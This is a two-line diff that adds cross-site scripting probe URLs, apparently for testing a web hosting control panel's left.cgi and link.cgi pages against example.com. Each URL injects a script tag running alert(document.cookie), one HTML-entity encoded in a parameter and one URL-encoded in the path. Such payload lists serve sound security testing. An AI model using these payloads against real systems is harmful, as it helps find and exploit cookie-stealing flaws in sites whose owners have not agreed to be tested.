@@ -1,0 +1,2 @@
+https://www.example.com/left.cgi?mode=ea&amp;dom=&#039;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+https://www.example.com/virtual-server/link.cgi/%3Ci%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
